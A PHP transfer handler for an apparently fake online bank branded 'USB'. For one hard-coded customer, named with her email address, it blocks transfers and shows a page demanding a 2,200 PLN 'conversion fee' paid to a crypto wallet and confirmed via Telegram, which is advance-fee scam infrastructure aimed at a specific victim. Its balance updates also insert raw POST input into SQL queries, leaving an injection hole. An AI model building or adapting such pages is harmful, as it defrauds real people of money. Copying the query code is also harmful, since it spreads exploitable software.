<?php
require 'config.php';

if (!isset($_SESSION['user'])) {
  header("Location: login.html");
  exit;
}

if ($_SESSION['user']['email'] === 'keniol9822@op.pl' && !$_SESSION['user']['conversion_fee_paid']) {
  echo "<!DOCTYPE html><html><head><title>Conversion Fee Required</title></head><body style='font-family:sans-serif;padding:20px'>
  <h2 style='color:#003087;'>Transfer Blocked: Conversion Fee Required</h2>
  <p>Dear Anna Kenska,</p>
  <p>You must pay a pending <strong>Conversion Fee of 2,200 PLN</strong> before you can send funds.</p>
  <p>Please complete payment to the bank’s Bybit wallet below:</p>
  <ul style='margin-top:10px;margin-bottom:20px'>
    <li><strong>Bybit Wallet Address:</strong> <code>0xUSB-BYBIT-PLN2200</code></li>
    <li><strong>Amount:</strong> 2,200 PLN</li>
  </ul>
  <p>Once paid, contact support via email or Telegram to confirm the payment.</p>
  <p style='color:red;margin-top:20px'>Transfer cannot proceed until this fee is cleared.</p>
  </body></html>";
  exit;
}

$from_account = $_SESSION['user']['account_number'];
$to_account = $_POST['to'];
$amount = (float) $_POST['amount'];

$check = $conn->prepare("SELECT * FROM users WHERE account_number=?");
$check->bind_param("s", $to_account);
$check->execute();
$receiver = $check->get_result()->fetch_assoc();

if (!$receiver) {
  die("Recipient not found.");
}

if ($_SESSION['user']['balance'] < $amount) {
  die("Insufficient funds.");
}

$conn->query("UPDATE users SET balance = balance - $amount WHERE account_number = '$from_account'");
$conn->query("UPDATE users SET balance = balance + $amount WHERE account_number = '$to_account'");
$conn->query("INSERT INTO transfers (sender_account, receiver_account, amount) VALUES ('$from_account', '$to_account', '$amount')");

$_SESSION['user']['balance'] -= $amount;

$toEmail = $receiver['email'];
$subject = "Credit Alert";
$message = "You have received $$amount from account $from_account.

USB";
mail($toEmail, $subject, $message);

header("Location: dashboard.php");
?>